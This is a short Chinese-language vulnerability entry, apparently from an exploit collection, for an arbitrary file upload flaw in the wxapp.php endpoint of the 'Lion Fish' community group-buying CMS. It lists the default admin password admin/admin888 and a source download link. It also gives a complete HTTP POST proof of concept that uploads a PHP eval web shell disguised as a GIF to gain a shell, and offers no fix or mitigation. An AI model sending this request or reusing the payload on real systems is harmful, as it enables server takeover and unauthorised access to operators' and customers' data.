# 狮子鱼社区团购系统 wxapp.php 文件上传漏洞


狮子鱼社区团购系统CMS wxapp.php文件上传漏洞，可上传任意文件，导致getshell.

后台默认密码为：admin/admin888

源码下载地址：http://cr3.9pj8m.com/shiziyushequtuangouyuanma.zip

修改数据库配置文件：

* Modules/Common/Conf/db.php
* Modules/Seller/Conf/db.php

poc：

```
POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
Host: 
Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
...

------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="upfile"; filename="123123.php"
Content-Type: image/gif

<?php @eval($_POST['a']);?>
------WebKitFormBoundary8UaANmWAgM4BqBSs--
```

参考：

https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4017

https://forum.ywhack.com/thread-115578-1-2.html